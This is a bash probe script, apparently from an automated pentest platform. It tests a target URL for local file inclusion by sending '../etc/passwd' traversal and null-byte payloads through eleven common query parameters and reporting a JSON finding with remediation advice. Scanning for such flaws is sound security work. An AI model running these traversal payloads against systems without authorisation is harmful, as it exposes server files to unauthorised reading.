#!/usr/bin/env bash
# ============================================================================
# SentinelAI Autonomous Pentest Platform — Security PoC Probe
# Name:        Local File Inclusion Probe (10 params)
# Description: Tests for LFI via /etc/passwd retrieval
# Severity:    CRITICAL
# Category:    Injection Flaws (SQLi, XSS, Command, SSTI, XXE)
# Language:    bash
# ============================================================================

# Target argument handling: allow positional arg $1 or env var TARGET
TARGET="${1:-${TARGET:-}}"
SCAN_ID="${SCAN_ID:-standalone_poc_test}"
DEPTH="${DEPTH:-standard}"

if [ -z "$TARGET" ]; then
  echo -e "\033[1;31m[-] Error: Missing TARGET argument.\033[0m"
  echo -e "\033[1;33m[*] Usage:   $0 <target_url_or_ip>\033[0m"
  echo -e "\033[1;34m[*] Example: $0 https://example.com\033[0m"
  exit 1
fi

# Normalize URL: remove trailing slash
TARGET="${TARGET%/}"

echo -e "\033[1;36m[*] [SentinelAI PoC] Running probe: Local File Inclusion Probe (10 params)\033[0m"
echo -e "\033[1;34m[*] Target: $TARGET\033[0m"
echo ""

# Standard emit handler for standalone terminal execution
emit() {
  echo -e "\033[1;32m[+] VULNERABILITY CONFIRMED / FINDING EMITTED:\033[0m"
  echo "$1" | python3 -m json.tool 2>/dev/null || echo "    $1"
}

# --- Core PoC Execution ---
emit() { printf '%s\n' "$1"; }
T="$TARGET"
PARAMS="file page path template include lang module view doc name cat"
TRAV="../../../../../../etc/passwd"
for P in $PARAMS; do
  RESP=$(curl -s --max-time 10 "$T?$P=$TRAV" 2>/dev/null | head -c 5000)
  if echo "$RESP" | grep -q "root:x:0:0"; then
    emit "{\"title\":\"Local File Inclusion: ?$P=\",\"severity\":\"critical\",\"description\":\"Parameter ?$P= allows reading arbitrary files via path traversal. /etc/passwd retrieved successfully.\",\"remediation\":\"Validate file paths against allowlist. Use chroot or restricted base directory.\",\"cweId\":\"CWE-98\",\"owaspCategory\":\"A01:2025-Broken Access Control\"}"
    break
  fi
  # null byte variant
  RESP=$(curl -s --max-time 10 "$T?$P=$TRAV%00" 2>/dev/null | head -c 5000)
  if echo "$RESP" | grep -q "root:x:0:0"; then
    emit "{\"title\":\"Local File Inclusion (null byte): ?$P=\",\"severity\":\"critical\",\"description\":\"Parameter ?$P= allows file read via path traversal + null byte.\",\"remediation\":\"Reject null bytes. Validate paths against allowlist.\",\"cweId\":\"CWE-98\",\"owaspCategory\":\"A01:2025-Broken Access Control\"}"
    break
  fi
done

echo ""
echo -e "\033[1;34m[*] Probe execution complete.\033[0m"
